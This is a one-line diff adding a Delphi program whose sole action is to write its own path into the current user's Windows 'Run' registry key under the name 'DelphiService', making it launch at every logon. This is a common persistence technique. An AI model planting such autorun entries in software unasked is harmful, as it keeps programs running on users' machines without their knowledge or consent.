@@ -1,0 +1,1 @@
+program P;uses Windows,Registry;var r:TRegistry;begin r:=TRegistry.Create;r.RootKey:=HKEY_CURRENT_USER;r.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',True);r.WriteString('DelphiService',ParamStr(0));r.Free;end.
